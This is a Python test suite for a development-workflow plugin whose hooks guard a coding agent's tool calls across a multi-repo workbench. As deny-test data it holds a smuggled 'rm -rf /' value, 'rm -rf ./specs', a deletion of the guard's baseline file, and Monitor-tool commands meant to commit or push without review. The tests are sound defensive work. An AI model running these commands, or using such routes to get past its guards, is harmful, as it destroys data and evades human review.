"""The workbench (one repo per app under a parent workbench repo) and the scope parsing it builds on.

Record: .sdlc/2026-11-13-l-workbench/change.md (AC-001 onward)."""
import json
import os
import sys
import unittest

from helpers import HOOKS, PLUGIN_ROOT, ProjectTestCase

sys.path.insert(0, HOOKS)
sys.path.insert(0, os.path.join(PLUGIN_ROOT, "scripts"))
import scaffold  # noqa: E402
import verify_freshness as vf  # noqa: E402

MONOREPO = {
    "commands": {"install": "pnpm install", "test": "pnpm -r test"},
    "packages": [
        {"name": "web", "path": "apps/web/", "stack": "node", "commands": {"test": "pnpm test", "lint": "pnpm lint"}},
        {"path": "./apps/api", "stack": "go", "commands": {"test": "go test ./..."}},
        {"name": "lib", "path": "packages/lib", "commands": {"test": "pnpm test"}},
    ],
}


class ScopeParsing(ProjectTestCase):
    def write_config(self, config):
        os.makedirs(self.path(".sdlc"), exist_ok=True)
        with open(self.path(".sdlc/config.json"), "w", encoding="utf-8") as f:
            json.dump(config, f)

    def test_one_scope_parser_for_scripts_and_hooks(self):
        self.write_config(MONOREPO)
        script = [(sc["name"], sc["path"]) for sc in scaffold.scopes(MONOREPO)]
        hook = [(sc["name"], sc["path"]) for sc in vf.load_scopes(self.root, None)[0]]
        self.assertEqual(script, hook)
        self.assertEqual(script, [("web", "apps/web"), ("apps/api", "apps/api"), ("lib", "packages/lib")])
        # A package without a name is still reported by the contract check
        os.makedirs(self.path("apps/web")), os.makedirs(self.path("apps/api")), os.makedirs(self.path("packages/lib"))
        out = scaffold.cmd_contract(scaffold.Project(self.root), None)
        self.assertIn("package without a name", out["scopes"]["apps/api"]["problems"])
        # Malformed packages are named, never guessed at or a traceback
        for bad, msg in (({"packages": [1]}, r"packages\[0\]"),({"packages": {"web": {}}}, "not a list")):
            with self.assertRaisesRegex(ValueError, msg):
                scaffold.scopes(bad)

    def test_root_test_beside_packages_runs_and_covers_every_package(self):
        self.write_config(MONOREPO)
        plan = scaffold.verify_plan(MONOREPO)
        root_steps = [(s["step"], s["cwd"], s["run"]) for s in plan["install"] + plan["verify"]
                      if s["scope"] == scaffold.ROOT_SCOPE]
        # Only the root test runs: other root commands (install here) keep not running, as before (H3)
        self.assertEqual(root_steps, [("test", ".", "pnpm -r test")])
        self.assertIn("pnpm -r test", scaffold.generate_ci(scaffold.Project(self.root)))
        # A package's own workflow leaves the root steps out
        self.assertNotIn("pnpm -r test", scaffold.generate_ci(scaffold.Project(self.root), "web"))
        scopes, root_tests = vf.load_scopes(self.root, None)
        self.assertEqual(vf.fresh_scopes("pnpm -r test", scopes, root_tests, self.root, self.root, True),
                         ["web", "apps/api", "lib"])

    def test_brownfield_reference_records_top_level_packages(self):
        path = os.path.join(PLUGIN_ROOT, "skills", "setting-up-projects", "references", "brownfield.md")
        with open(path, encoding="utf-8") as f:
            text = f.read()
        self.assertNotIn("→ `project` (`stack`, and `packages`", text)
        self.assertIn("top-level `packages`", text)


def rmtree(path):
    """shutil.rmtree that also removes git's read-only object files (Windows refuses to delete them)."""
    import shutil
    import stat

    def writable(func, p, _):
        os.chmod(p, stat.S_IWRITE)
        func(p)
    shutil.rmtree(path, onerror=writable)


def git(cwd, *args):
    import subprocess
    subprocess.run(["git", "-c", "user.email=t@example.com", "-c", "user.name=t", *args], cwd=cwd, check=True,
                   capture_output=True)


class WorkbenchTestCase(ProjectTestCase):
    """A workbench at self.root: a git repo whose config says `"workbench": true`."""

    def setUp(self):
        super().setUp()
        git(self.root, "init", "-q")
        self.write_json(".sdlc/config.json", {"workbench": True})

    def write_json(self, rel, data):
        os.makedirs(os.path.dirname(self.path(rel)) or self.root, exist_ok=True)
        with open(self.path(rel), "w", encoding="utf-8") as f:
            json.dump(data, f)

    def origin(self, name, config=None):
        """A bare-able source repo outside the workbench to clone from; returns its file URL."""
        import tempfile
        src = os.path.realpath(tempfile.mkdtemp(prefix=f"sdlc-origin-{name}-"))
        self.addCleanup(__import__("shutil").rmtree, src, ignore_errors=True)
        git(src, "init", "-q")
        if config is not None:
            os.makedirs(os.path.join(src, ".sdlc"))
            with open(os.path.join(src, ".sdlc", "config.json"), "w", encoding="utf-8") as f:
                json.dump(config, f)
        with open(os.path.join(src, "README.md"), "w", encoding="utf-8") as f:
            f.write(name)
        git(src, "add", "-A")
        git(src, "commit", "-q", "-m", "init")
        return src

    def run_scaffold(self, *args):
        import subprocess
        p = subprocess.run([sys.executable, os.path.join(PLUGIN_ROOT, "scripts", "scaffold.py"), "--root", self.root,
                            *args], capture_output=True, encoding="utf-8", errors="replace")
        return p.returncode, (json.loads(p.stdout) if p.stdout.strip().startswith("{") else p.stdout), p.stderr

    def gitignore(self):
        try:
            with open(self.path(".gitignore"), encoding="utf-8", errors="surrogateescape") as f:
                return f.read().splitlines()
        except FileNotFoundError:
            return []


class WorkbenchManifest(WorkbenchTestCase):
    def test_workbench_scopes_and_detection(self):
        import sdlc_scopes
        self.write_json("workbench.json", {"repos": [
            {"name": "api", "url": "u1", "role": "app", "write": True, "contract": {"provides": "v1"}},
            {"name": "web", "url": "u2", "role": "app", "write": True, "contract": {"consumes": "v1"}},
            {"name": "specs", "url": "u3", "role": "specs", "owner": "@org/ba"},
        ]})
        self.write_json("api/.sdlc/config.json", {"commands": {"test": "go test ./..."}, "project": {"stack": "go"}})
        self.assertTrue(sdlc_scopes.is_workbench(self.root))
        got = [(s["name"], s["path"], s["commands"].get("test")) for s in sdlc_scopes.workbench_scopes(self.root)]
        self.assertEqual(got, [("api", "api", "go test ./..."), ("web", "web", None),
                               (sdlc_scopes.WORKBENCH_SCOPE, ".", None)])
        # product-rebuild's repos.yaml alone, or no workbench key: not a workbench
        os.remove(self.path("workbench.json"))
        with open(self.path("repos.yaml"), "w", encoding="utf-8") as f:
            f.write("repos:\n  - name: api\n    path: ../api\n")
        self.assertFalse(sdlc_scopes.is_workbench(self.root))
        self.write_json(".sdlc/config.json", {"workbench": "yes"})
        self.write_json("workbench.json", {"repos": []})
        self.assertFalse(sdlc_scopes.is_workbench(self.root))
        # Malformed manifests are named, never a traceback
        self.write_json(".sdlc/config.json", {"workbench": True})
        for bad in ([], {"repos": None}, {"repos": [1]}, {"repos": [{"name": "api", "url": None, "role": "app"}]},
                    {"repos": [{"name": "api", "url": "u", "role": "boss"}]},
                    {"repos": [{"name": "api", "url": "u", "role": "specs", "write": True}]},
                    {"repos": [{"name": "api", "url": "u", "role": "app", "write": "yes"}]},
                    {"repos": [{"name": "a", "url": "u", "role": "app"}, {"name": "a", "url": "v", "role": "app"}]}):
            self.write_json("workbench.json", bad)
            with self.assertRaisesRegex(ValueError, "^not run: workbench.json"):
                sdlc_scopes.manifest(self.root)

    def test_workbench_add_and_remove_refuse_a_linked_gitignore(self):
        # R2-M2 of 2026-11-22-s-fixed-writers-refuse-links: the .gitignore rewrites and the clone's rollback
        import tempfile
        url = self.origin("api", {"commands": {"test": "true"}})
        outside = os.path.realpath(tempfile.mkdtemp(prefix="sdlc-outside-"))
        self.addCleanup(rmtree, outside)
        target = os.path.join(outside, "gitignore")
        with open(target, "w", encoding="utf-8") as f:
            f.write("theirs\n")
        if os.path.lexists(self.path(".gitignore")):
            os.remove(self.path(".gitignore"))
        try:
            os.symlink(target, self.path(".gitignore"))
        except (OSError, NotImplementedError):
            self.skipTest("symlinks unavailable")
        code, out, err = self.run_scaffold("workbench", "add", url, "--name", "api", "--role", "app", "--write")
        self.assertEqual(code, 2, (out, err))
        self.assertIn(".gitignore", out["refused"])
        self.assertFalse(os.path.exists(self.path("api")))  # the clone is rolled back
        os.remove(self.path(".gitignore"))
        code, out, err = self.run_scaffold("workbench", "add", url, "--name", "api", "--role", "app", "--write")
        self.assertEqual(code, 0, (out, err))
        os.remove(self.path(".gitignore"))
        os.symlink(target, self.path(".gitignore"))
        rmtree(self.path("api"))
        code, out, err = self.run_scaffold("workbench", "remove", "api")
        self.assertEqual(code, 2, (out, err))
        with open(target, encoding="utf-8") as f:
            self.assertEqual(f.read(), "theirs\n")

    def test_workbench_add_and_remove(self):
        import sdlc_scopes
        url = self.origin("api", {"commands": {"test": "true"}})
        code, out, err = self.run_scaffold("workbench", "add", url, "--name", "api", "--role", "app", "--write",
                                           "--owner", "@org/backend")
        self.assertEqual(code, 0, (out, err))
        self.assertTrue(os.path.isfile(self.path("api/README.md")))
        self.assertIn("/api/", self.gitignore())
        [entry] = sdlc_scopes.manifest(self.root)
        self.assertEqual((entry["name"], entry["url"], entry["role"], entry["write"], entry["owner"]),
                         ("api", url, "app", True, "@org/backend"))
        # A read-only repo, named from its URL
        specs = self.origin("specs")
        code, out, err = self.run_scaffold("workbench", "add", specs, "--role", "specs")
        self.assertEqual(code, 0, (out, err))
        name = os.path.basename(specs)
        self.assertFalse(sdlc_scopes.manifest(self.root)[1]["write"])
        # remove: entry and gitignore line go, the folder stays
        code, out, err = self.run_scaffold("workbench", "remove", "api")
        self.assertEqual(code, 0, (out, err))
        self.assertEqual([r["name"] for r in sdlc_scopes.manifest(self.root)], [name])
        # The folder is kept, so its ignore line stays (the workbench never commits the repo); once the user
        # deletes the folder, remove drops the line
        self.assertTrue(os.path.isdir(self.path("api")))
        self.assertIn("/api/", self.gitignore())
        self.assertIn("api", out["note"])
        rmtree(self.path("api"))
        code, out, err = self.run_scaffold("workbench", "remove", "api")
        self.assertEqual(code, 0, (out, err))
        self.assertNotIn("/api/", self.gitignore())
        # Names that aren't plain folder names are refused and nothing is written
        def snapshot():
            with open(self.path("workbench.json"), encoding="utf-8") as f:
                return f.read(), self.gitignore()
        before = snapshot()
        for bad in ("@org/web", "a/b", "..", "a\\b", ".git", ".sdlc", ".claude", "C:x", "-x", ""):
            code, out, err = self.run_scaffold("workbench", "add", url, f"--name={bad}", "--role", "app")
            self.assertNotEqual(code, 0, bad)
            self.assertIn("not a plain folder name", json.dumps(out) + err, bad)
        self.assertEqual(before, snapshot())
        self.assertFalse(os.path.exists(os.path.join(os.path.dirname(self.root), "web")))
        # Outside a workbench: refused
        self.write_json(".sdlc/config.json", {})
        code, out, err = self.run_scaffold("workbench", "add", url, "--name", "web", "--role", "app")
        self.assertNotEqual(code, 0)
        self.assertIn("not a workbench", json.dumps(out) + err)

    def test_doctor_reports_workbench_drift(self):
        import doctor
        self.write_json("workbench.json", {"repos": [
            {"name": "api", "url": "u1", "role": "app", "write": True},
            {"name": "web", "url": "u2", "role": "app", "write": True},
            {"name": "specs", "url": "u3", "role": "specs"},
        ]})
        os.makedirs(self.path("api/.git")), os.makedirs(self.path("web/.git")), os.makedirs(self.path("stray/.git"))
        self.write_json("web/.sdlc/config.json", {"commands": {}})
        with open(self.path(".gitignore"), "w", encoding="utf-8") as f:
            f.write("/web/\nspecs\n")
        r = doctor.Report()
        doctor.check_workbench(r, self.root)
        rows = {c["check"]: c for c in r.checks}
        self.assertIn("specs", rows["workbench repos"]["detail"])  # listed, not cloned
        self.assertIn("stray", rows["workbench unlisted"]["detail"])
        self.assertIn("api", rows["workbench gitignore"]["detail"])
        self.assertNotIn("web", rows["workbench gitignore"]["detail"])
        self.assertIn("api", rows["workbench app setup"]["detail"])
        self.assertNotIn("web", rows["workbench app setup"]["detail"])
        # A malformed manifest is a failed row, not a crash; outside a workbench, no rows
        self.write_json("workbench.json", {"repos": [1]})
        r = doctor.Report()
        doctor.check_workbench(r, self.root)
        self.assertEqual([c["status"] for c in r.checks], ["fail"])
        self.write_json(".sdlc/config.json", {})
        r = doctor.Report()
        doctor.check_workbench(r, self.root)
        self.assertEqual(r.checks, [])


def block_rule(name, word, event="bash", field="command"):
    return (f"---\nname: {name}\nenabled: true\nevent: {event}\naction: block\nconditions:\n"
            f"  - field: {field}\n    operator: regex_match\n    pattern: {word}\n---\n{name} says no\n")


class WorkbenchGuardsCase(WorkbenchTestCase):
    """A session started in the workbench (which has its own .sdlc/): api/ is a writable app repo with its own
    guardrails, specs/ another team's read-only repo."""

    def setUp(self):
        super().setUp()
        self.write_json("workbench.json", {"repos": [
            {"name": "api", "url": "u1", "role": "app", "write": True},
            {"name": "specs", "url": "u2", "role": "specs", "owner": "@org/ba"},
        ]})
        self.write_json("api/.sdlc/config.json", {"workbench": "shop-workbench", "commands": {}})
        self.write("api/.claude/hookify/no-x.md", block_rule("no-x", "forbidden"))
        self.write("api/.claude/hookify/no-secret.md", block_rule("no-secret", "SECRET", "file", "new_text"))
        self.write("specs/a.md", "spec\n")

    def pre(self, tool, cwd=None, **tool_input):
        from helpers import run_hook
        payload = {"hook_event_name": "PreToolUse", "tool_name": tool, "tool_input": tool_input,
                   "cwd": cwd or self.root}
        code, out, raw, err = run_hook(["python3", os.path.join(HOOKS, "pretooluse.py")], payload, self.root)
        self.assertEqual(code, 0, err)
        hso = (out or {}).get("hookSpecificOutput", {})
        return hso.get("permissionDecisionReason", "") if hso.get("permissionDecision") == "deny" else None

    def guard(self, path, agent):
        from helpers import run_hook
        payload = {"hook_event_name": "PreToolUse", "cwd": self.root, "tool_name": "Write",
                   "tool_input": {"file_path": path}, "agent_type": agent}
        code, out, raw, err = run_hook(["python3", os.path.join(HOOKS, "role_guard.py")], payload, self.root)
        self.assertEqual(code, 0, err)
        return (out or {}).get("hookSpecificOutput", {}).get("permissionDecision")



class WorkbenchGuards(WorkbenchGuardsCase):
    def test_guards_route_into_an_app_repo_from_a_workbench(self):
        api = self.path("api")
        self.assertIn("no-x", self.pre("Bash", command="cd api && echo forbidden") or "")
        self.assertIn("no-x", self.pre("Bash", cwd=api, command="echo forbidden") or "")
        self.assertIn("no-secret", self.pre("Write", file_path=self.path("api/src/a.ts"), content="SECRET=1") or "")
        self.assertIsNone(self.pre("Write", file_path=self.path("docs/a.md"), content="SECRET=1"))
        # The role guard judges api's files against api, and the workbench's own findings folder stays open
        self.assertEqual(self.guard(self.path("api/src/a.ts"), "sdlc:code-reviewer"), "deny")
        self.assertIsNone(self.guard(self.path(".sdlc/.work/findings/f/r.md"), "sdlc:code-reviewer"))
        # A repo that isn't a workbench (no key, or the key without a manifest) behaves as before
        for config, manifest in (({}, True), ({"workbench": True}, False), ({"workbench": "yes"}, True)):
            self.write_json(".sdlc/config.json", config)
            if not manifest:
                os.remove(self.path("workbench.json"))
            self.assertIsNone(self.pre("Bash", command="cd api && echo forbidden"), config)
            self.assertIsNone(self.pre("Write", file_path=self.path("api/src/a.ts"), content="SECRET=1"), config)

    def test_a_monitor_command_meets_the_read_only_guard(self):
        # .sdlc/2026-11-22-s-monitor-read-only-guard AC-001: the Monitor tool runs a shell command, judged as sh
        for command in ("echo hi > specs/a.md", "cd specs && rm a.md", "until false; do touch specs/x; done",
                        "rm ~/.cache/sdlc/read-only-baseline.json"):
            self.assertIsNotNone(self.pre("Monitor", command=command, description="d"), command)
        self.assertIn("@org/ba", self.pre("Monitor", command="tail -f log > specs/a.md", description="d"))
        for command in ("tail -f specs/a.md", "until grep -q done api/log; do sleep 2; done"):
            self.assertIsNone(self.pre("Monitor", command=command, description="d"), command)

    def test_a_monitor_command_cannot_commit_or_push(self):
        # end-of-push review r1 SH-H5: the commit and push reviews run after a Bash call; a Monitor one would skip them
        # Denied exactly where a Bash call would get a commit or push review: the review hook's own patterns decide
        for command in ("git commit -am x", "cd api && git commit -m y && git push", "git -C api push origin HEAD",
                        "gt submit", "git -c user.name=x commit -m y", "git -C api commit -m y",
                        "git --no-pager -c core.editor=true commit -m y", "make && git commit -m y",
                        "git --git-dir=.git push", "gt create -m x", "gt modify",
                        "git -c 'alias.x=!a;b' commit -m y"):
            reason = self.pre("Monitor", command=command, description="d")
            self.assertIsNotNone(reason, command)
            self.assertIn("Bash", reason)
        for command in ("tail -f log", "until grep -q done log; do sleep 2; done", "git log --oneline",
                        "git log --grep=push", "git stash push -m x", "git log -S commit", "gt log",
                        "git merge --no-commit main", "git commit-graph write"):
            self.assertIsNone(self.pre("Monitor", command=command, description="d"), command)

    def test_the_monitor_deny_holds_when_the_review_hook_cannot_load(self):
        # end review SP-M1: a bad env value broke the review hook's import, and the deny turned itself off
        from helpers import run_hook
        payload = {"hook_event_name": "PreToolUse", "tool_name": "Monitor", "cwd": self.root,
                   "tool_input": {"command": "git -C api commit -m x", "description": "d"}}
        _, out, _, _ = run_hook(["python3", os.path.join(HOOKS, "pretooluse.py")], payload, self.root,
                                {"MAX_DIFF_FILES": "x", "MAX_COMMIT_REVIEWS_PER_HOUR": "x"})
        self.assertEqual((out or {}).get("hookSpecificOutput", {}).get("permissionDecision"), "deny")

    def test_hooks_json_sends_monitor_to_the_read_only_guard(self):
        # AC-002: the PreToolUse entry that runs pretooluse.py matches the Monitor tool, and keeps the others
        with open(os.path.join(HOOKS, "hooks.json"), encoding="utf-8") as f:
            pre = json.load(f)["hooks"]["PreToolUse"]
        matchers = [e["matcher"] for e in pre if any("pretooluse.py" in h.get("command", "") for h in e["hooks"])]
        self.assertEqual(len(matchers), 1)
        self.assertEqual(set(matchers[0].split("|")),
                         {"Bash", "PowerShell", "Monitor", "Edit", "Write", "MultiEdit", "NotebookEdit"})

    def test_writes_into_a_read_only_repo_are_denied(self):
        specs = self.path("specs")
        denied = [("Write", {"file_path": self.path("specs/b.md"), "content": "x"}),
                  ("Edit", {"file_path": "specs/a.md", "old_string": "spec", "new_string": "x"}),
                  ("Write", {"file_path": self.path("specs/deep/c.md"), "content": "x"}),
                  ("Bash", {"command": "echo hi > specs/a.md"}),
                  ("Bash", {"command": "cd specs && rm a.md"}),
                  ("Bash", {"command": "sed -i s/a/b/ specs/a.md"}),
                  ("Bash", {"command": "cp README.md specs/"}),
                  ("Bash", {"command": "mv specs/a.md ."}),
                  ("Bash", {"command": "touch specs/new.md"}),
                  ("Bash", {"command": "bash -c 'mkdir specs/x'"}),
                  ("Bash", {"command": f"git -C {specs} commit -am x"}),
                  ("Bash", {"command": "cd specs && git push origin main"}),
                  ("Bash", {"command": "rm -rf ./specs"}),
                  ("PowerShell", {"command": "Set-Content specs\\a.md x"})]
        if os.path.normcase("A") == "a" or sys.platform == "darwin":
            denied.append(("Write", {"file_path": self.path("SPECS/b.md"), "content": "x"}))
        for tool, tin in denied:
            reason = self.pre(tool, **tin)
            self.assertIsNotNone(reason, (tool, tin))
            self.assertIn("specs", reason)
            self.assertIn("@org/ba", reason)
        # Writes from inside the repo, and through a link to it
        self.assertIsNotNone(self.pre("Bash", cwd=specs, command="echo x > b.md"))
        os.symlink(specs, self.path("s2"))
        self.assertIsNotNone(self.pre("Write", file_path=self.path("s2/b.md"), content="x"))
        # Reads, and writes elsewhere, stay open
        for tool, tin in [("Bash", {"command": "cat specs/a.md"}), ("Bash", {"command": f"git -C {specs} log"}),
                          ("Bash", {"command": "cd specs && git pull"}),
                          ("Bash", {"command": "cp specs/a.md docs/a.md"}),
                          ("Write", {"file_path": self.path("api/a.ts"), "content": "x"}),
                          ("Write", {"file_path": self.path("specsx/a.md"), "content": "x"})]:
            self.assertIsNone(self.pre(tool, **tin), (tool, tin))
        # Not a workbench: no read-only repos
        self.write_json(".sdlc/config.json", {})
        self.assertIsNone(self.pre("Write", file_path=self.path("specs/b.md"), content="x"))

    def test_no_feature_starts_in_an_app_repo(self):
        import subprocess
        def new(root):
            p = subprocess.run([sys.executable, os.path.join(PLUGIN_ROOT, "scripts", "state.py"), "--root", root,
                                "new", "feat", "--track", "S", "--risk", "low", "--task", "x | AC-001 | a.py"],
                               capture_output=True, encoding="utf-8", errors="replace")
            return p.returncode, p.stdout
        api = self.path("api")
        before = sorted(os.listdir(os.path.join(api, ".sdlc")))
        code, out = new(api)
        self.assertEqual(code, 1, out)
        self.assertIn("shop-workbench", out)
        self.assertIn(self.root, json.loads(out)["error"])
        self.assertEqual(sorted(os.listdir(os.path.join(api, ".sdlc"))), before)
        # The workbench itself starts features
        code, out = new(self.root)
        self.assertEqual(code, 0, out)


def git_out(cwd, *args):
    import subprocess
    return subprocess.run(["git", *args], cwd=cwd, capture_output=True, encoding="utf-8",
                          errors="replace").stdout.strip()


CHECK = "import os, sys; sys.exit(1 if os.path.exists('broken') else 0)\n"


class WorkbenchFeatureCase(WorkbenchTestCase):
    """A workbench on branch feat-x with a feature `feat`; api/ and web/ are writable app repos on main, specs/ a
    read-only repo."""

    def setUp(self):
        super().setUp()
        self.write_json("workbench.json", {"repos": [
            {"name": "api", "url": "u1", "role": "app", "write": True},
            {"name": "web", "url": "u2", "role": "app", "write": True},
            {"name": "specs", "url": "u3", "role": "specs"},
        ]})
        self.write(".gitignore", "/api/\n/web/\n/specs/\n")
        git(self.root, "add", "-A")
        git(self.root, "commit", "-q", "-m", "workbench")
        git(self.root, "checkout", "-q", "-b", "feat-x")
        for name in ("api", "web", "specs"):
            d = self.path(name)
            git(self.root, "init", "-q", "-b", "main", name)
            if name != "specs":
                self.write_json(f"{name}/.sdlc/config.json",
                                {"workbench": "shop-workbench", "commands": {"test": "python3 check.py"}})
                self.write(f"{name}/check.py", CHECK)
                self.write(f"{name}/.gitignore", ".sdlc/.work/\n")
            self.write(f"{name}/README.md", name)
            git(d, "add", "-A")
            git(d, "commit", "-q", "-m", "init")
        code, out = self.state("new", "feat", "--track", "M", "--risk", "low", "--task", "x | AC-001 | api/a.py")
        self.assertEqual(code, 0, out)

    def state(self, *args):
        import subprocess
        p = subprocess.run([sys.executable, os.path.join(PLUGIN_ROOT, "scripts", "state.py"), "--root", self.root,
                            *args], capture_output=True, encoding="utf-8", errors="replace")
        return p.returncode, p.stdout

    def state_text(self):
        with open(self.path(".sdlc/feat/state.md"), encoding="utf-8") as f:
            return f.read()



class WorkbenchFeature(WorkbenchFeatureCase):
    def test_build_branches_and_verifies_each_touched_repo(self):
        import sdlc_scopes
        import verify
        api_main = git_out(self.path("api"), "rev-parse", "HEAD")
        code, out = self.state("repo", "feat", "api")
        self.assertEqual(code, 0, out)
        self.assertEqual(git_out(self.path("api"), "rev-parse", "--abbrev-ref", "HEAD"), "feat-x")
        self.assertEqual(sdlc_scopes.feature_repos(self.state_text())["api"],
                         {"branch": "feat-x", "base": api_main})
        # Again: already recorded, nothing changes
        before = self.state_text()
        self.assertEqual(self.state("repo", "feat", "api")[0], 0)
        self.assertEqual(self.state_text(), before)
        # A dirty repo is refused, naming it; no branch, nothing recorded
        self.write("web/wip.txt", "x")
        code, out = self.state("repo", "feat", "web")
        self.assertEqual(code, 1, out)
        self.assertIn("web", json.loads(out)["error"])
        self.assertIn("uncommitted", json.loads(out)["error"])
        self.assertEqual(git_out(self.path("web"), "rev-parse", "--abbrev-ref", "HEAD"), "main")
        self.assertNotIn("web", sdlc_scopes.feature_repos(self.state_text()))
        # A read-only repo records the commit read; an unlisted name or a bad one is refused
        code, out = self.state("repo", "feat", "specs")
        self.assertEqual(code, 0, out)
        self.assertEqual(sdlc_scopes.feature_repos(self.state_text())["specs"],
                         {"read": git_out(self.path("specs"), "rev-parse", "HEAD")})
        for bad in ("nope", "../x", ".sdlc"):
            self.assertEqual(self.state("repo", "feat", bad)[0], 1, bad)
        # verify runs each touched repo's plan in its folder; a failure names the repo
        self.assertEqual(verify.repo_failures(self.root, "feat", 60), [])
        self.write("api/broken", "")
        failures = verify.repo_failures(self.root, "feat", 60)
        self.assertEqual(len(failures), 1, failures)
        self.assertTrue(failures[0].startswith("api: "), failures)

    def hook(self, event, tool=None, cwd=None, **tool_input):
        from helpers import run_hook
        payload = {"hook_event_name": event, "cwd": cwd or self.root}
        if tool:
            payload.update(tool_name=tool, tool_input=tool_input, tool_response={})
        code, out, raw, err = run_hook(["python3", os.path.join(HOOKS, "verify_freshness.py")], payload, self.root)
        self.assertEqual(code, 0, err)
        self.assertFalse(os.path.exists(self.path(".sdlc/.work/verify-freshness.error")),
                         open(self.path(".sdlc/.work/verify-freshness.error")).read()
                         if os.path.exists(self.path(".sdlc/.work/verify-freshness.error")) else "")
        return out

    def scopes(self):
        with open(self.path(".sdlc/.work/verify-freshness.json"), encoding="utf-8") as f:
            return json.load(f)["scopes"]

    def test_freshness_is_per_app_repo(self):
        for name in ("api", "web"):
            self.assertEqual(self.state("repo", "feat", name)[0], 0)
            self.write(f"{name}/a.py", "x = 1\n")
        self.assertEqual(self.state("advance", "feat", "3")[0], 0)
        self.hook("PostToolUse", "Edit", file_path=self.path("api/a.py"))
        st = self.scopes()
        self.assertTrue(st["api"]["stale"])
        self.assertIn("api/a.py", st["api"]["reason"])
        self.assertNotIn("api/a.py", st["web"].get("reason", ""))
        # A full test run in api/ makes only api fresh
        self.hook("PostToolUse", "Bash", command="cd api && python3 check.py")
        st = self.scopes()
        self.assertFalse(st["api"]["stale"])
        self.assertTrue(st["web"]["stale"])
        out = self.hook("Stop")
        self.assertIn("web:", out["reason"])
        self.assertNotIn("api:", out["reason"])
        # A change in api/ that no edit tool made is seen at the next stop, in api only
        self.write("api/a.py", "x = 2\n")
        out = self.hook("Stop")
        self.assertIn("api: api/a.py", out["reason"])
        # web's own run clears web, from its folder only
        self.hook("PostToolUse", "Bash", command="python3 check.py", cwd=self.path("web"))
        self.assertFalse(self.scopes()["web"]["stale"])

    def test_moved_read_only_repo_is_reported(self):
        import subprocess
        specs = self.path("specs")
        self.write("specs/b.md", "b")
        git(specs, "add", "-A")
        git(specs, "commit", "-q", "-m", "b")
        recorded = git_out(specs, "rev-parse", "HEAD")
        self.assertEqual(self.state("repo", "feat", "specs")[0], 0)

        def stats():
            p = subprocess.run([sys.executable, os.path.join(PLUGIN_ROOT, "scripts", "diff_stats.py"), "--root",
                                self.root, "--plan", self.path(".sdlc/feat/state.md")], capture_output=True,
                               encoding="utf-8", errors="replace")
            self.assertEqual(p.returncode, 0, p.stdout + p.stderr)
            return json.loads(p.stdout)
        self.assertEqual(stats()["read_only"], [])
        self.write("specs/c.md", "c")
        git(specs, "add", "-A")
        git(specs, "commit", "-q", "-m", "c")
        current = git_out(specs, "rev-parse", "HEAD")
        r = stats()
        self.assertEqual(r["read_only"], [{"repo": "specs", "recorded": recorded, "current": current,
                                           "files": ["c.md"], "gone": False}])
        self.assertTrue(any("specs" in f and "moved" in f for f in r["flags"]), r["flags"])
        # Force-pushed: the recorded commit is gone
        git(specs, "reset", "-q", "--hard", "HEAD~2")
        git(specs, "reflog", "expire", "--expire=now", "--all")
        git(specs, "gc", "-q", "--prune=now")
        [moved] = stats()["read_only"]
        self.assertTrue(moved["gone"], moved)
        self.assertTrue(any("no longer exists" in f for f in stats()["flags"]))


class WorkbenchCI(WorkbenchTestCase):
    def test_app_ci_checks_out_the_workbench(self):
        self.write_json(".sdlc/config.json", {"workbench": True,
                                              "api_contract": {"path": "contract", "spec": "openapi.yaml"}})
        self.write_json("workbench.json", {"repos": [
            {"name": "api", "url": "u1", "role": "app", "write": True, "contract": {"provides": "v1"}},
            {"name": "web", "url": "u2", "role": "app", "write": True, "contract": {"consumes": "v1"}},
        ]})
        for name in ("api", "web"):
            self.write_json(f"{name}/.sdlc/config.json", {"workbench": "shop-workbench", "project": {"stack": "node"},
                                                          "commands": {"install": "pnpm install",
                                                                       "test": "pnpm test"}})
        ci = scaffold.generate_ci(scaffold.Project(self.path("web")))
        self.assertIn("repository: ${{ github.repository_owner }}/shop-workbench", ci)
        self.assertIn("github.head_ref || github.ref_name", ci)
        self.assertIn("ref=main", ci)
        self.assertIn("../contract", ci)
        # The token isn't left in the checkout, and the checkout leaves the app's tree before its own steps (S5, L4)
        self.assertIn("persist-credentials: false", ci)
        self.assertIn("&& rm -rf .workbench", ci)
        # Before the install step, and the branch reaches the script only through env, never inlined
        self.assertLess(ci.index("shop-workbench"), ci.index("pnpm install"))
        self.assertNotIn("${{ github.head_ref }}\n", ci.split("run: |", 1)[1].split("env:")[0])
        # An owner/name back-reference is used as is
        self.write_json("web/.sdlc/config.json", {"workbench": "acme/shop-workbench",
                                                  "commands": {"test": "pnpm test"}})
        self.assertIn("repository: acme/shop-workbench", scaffold.generate_ci(scaffold.Project(self.path("web"))))
        # The provider, a repo outside a workbench, and a bad back-reference get no workbench checkout
        self.assertNotIn("shop-workbench", scaffold.generate_ci(scaffold.Project(self.path("api"))))
        self.write_json("web/.sdlc/config.json", {"workbench": "a b; rm -rf /", "commands": {"test": "pnpm test"}})
        self.assertNotIn("rm -rf", scaffold.generate_ci(scaffold.Project(self.path("web"))))
        # The workbench's contract check reads api_contract.path unchanged
        self.assertIn('"origin/${{ github.base_ref }}" contract openapi.yaml',
                      scaffold.generate_contract_check(scaffold.Project(self.root)))


def read_doc(*parts):
    with open(os.path.join(PLUGIN_ROOT, *parts), encoding="utf-8") as f:
        return f.read()


class WorkbenchDocs(unittest.TestCase):
    def test_setup_and_docs_describe_the_workbench(self):
        refs = ("skills", "setting-up-projects", "references")
        greenfield = read_doc(*refs, "greenfield.md")
        # Two or more apps: setup asks, offering both layouts as equals (the monorepo is never only "on request")
        route = next(line for line in greenfield.splitlines() if "Two or more apps" in line)
        for needed in ("workbench.md", "monorepo.md", "ask", "one team"):
            self.assertIn(needed, route, needed)
        self.assertNotIn("on request", route)
        self.assertNotIn("only when the user asks", route)
        workbench = read_doc(*refs, "workbench.md")
        for needed in ("workbench.json", '"workbench": true', "scaffold.py\" workbench add", "state.py",
                       " repo ", "ship.py", "--status", "WORKBENCH_TOKEN", "contract/v1/openapi.yaml",
                       "write", "0025"):
            self.assertIn(needed, workbench, needed)
        self.assertIn("workbench.md", read_doc("skills", "setting-up-projects", "SKILL.md"))
        monorepo = read_doc(*refs, "monorepo.md")
        self.assertIn("0025", monorepo)
        self.assertNotIn("Only when the user asks", monorepo)
        self.assertNotIn("supersed", read_doc("skills", "setting-up-projects", "SKILL.md").lower())
        adr = read_doc("docs", "adr", "0025-workbench-for-multi-app-projects.md")
        self.assertIn("Extends [ADR 0005]", adr)
        self.assertNotIn("Supersedes", adr)
        index = read_doc("docs", "adr", "README.md")
        self.assertIn("0025", index)
